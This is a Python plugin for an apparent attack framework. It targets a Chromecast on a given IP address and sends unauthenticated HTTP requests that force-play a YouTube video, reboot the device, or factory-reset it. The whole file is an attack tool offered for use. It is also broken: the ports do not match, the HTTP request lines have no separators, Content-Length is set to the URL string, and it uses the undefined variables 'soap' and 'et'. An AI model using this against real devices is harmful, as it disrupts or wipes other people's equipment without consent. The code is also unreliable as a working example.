#!/usr/bin/env python3
Description = 'Bypass authentication on the chromecast and gain control'
from pluginsupport import *
import socket, requests, string, time

target = ask('rhost')

def run():
    ip = target
    if ip == "":
        print("Set An RHOST!")
        dashboard()
    defurl = "https://youtube.com/watch?v=dQw4w9WgXcQ"
    default8 = "0"
    time.sleep(0.2)
    text("Function :: Attack method on chromecast")
    print("")
    print("*0) Youtube")
    print(" 1) Reboot")
    print(" 2) Factory Reset")
    print("")
    function = input('[\033[1;92m*\033[1;m] function: [' + default8 + ']: ') or default8
    if function == "0":
       text("URL :: Enter youtube url")
       url = input('[\033[1;92m*\033[1;m] url: [' + defurl + ']: ') or defurl
       final_url = url.split("/")[-1]
       target_host = ip
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       server_address = (target_host, 8080)
       sock.connect(server_address)
       message = "POST /apps/YouTube HTTP/1.1"
       message += "Host: " + target_host + ":8008"
       message += """User-Agent: _0K!L*`t.I_CP&OOz_OkqNcfQ%5BkP3U]m<o\'"""
       message += "Content-Type:application/x-www-form-urlencode"
       message += "Content-Length:%s" % (final_url)
       message += ""
       message += "%s" % (final_url)
       sock.send(message)
       data = sock.recv(1024)
       d = "Data recieved: " + data.strip()
       text(d)
       sock.send(soap)
       data = sock.recv(1024)
       data += sock.recv(1024)
       success("Exploit sent...")
       sock.close()
    if function == "1":
       target_host = ip
       sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       server_address = (target_host, 8080)
       sock.connect(server_address)
       message = "POST /setup/reboot HTTP/1.1"
       message += "Host: " + target_host + ":8008"
       message += """User-Agent: _0K!L*`t.I_CP&OOz_OkqNcfQ%5BkP3U]m<o\'"""
       message += "Content-Type: application/json"
       message += "Content-Length: 17"
       message += ""
       message += "{\"params\": \"now\"}"
       sock.send(message)
       data = sock.recv(1024)
       d = "Data recieved: " + data.strip()
       text(d)
       sock.send(soap)
       data = sock.recv(1024)
       data += sock.recv(1024)
       success("Exploit sent...")
       sock.close()
    if function == "2":
      target_host = ip
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      server_address = (target_host, 8080)
      sock.connect(server_address)
      message = "POST /setup/reboot HTTP/1.1"
      message += "Host: " + target_host + ":8008"
      message += """User-Agent: _0K!L*`t.I_CP&OOz_OkqNcfQ%5BkP3U]m<o\'"""
      message += "Content-Type: application/json"
      message += "Content-Length: 17"
      message += ""
      message += "{\"params\": \"fdr\"}"
      sock.send(message)
      data = sock.recv(1024)
      d = "Data recieved: " + data.strip()
      text(d)
      sock.send(soap)
      data = sock.recv(1024)
      data += sock.recv(1024)
      success("Exploit sent...")
      sock.close()
    elif et == 'no':
         exit()
    else:
       exit()

run()
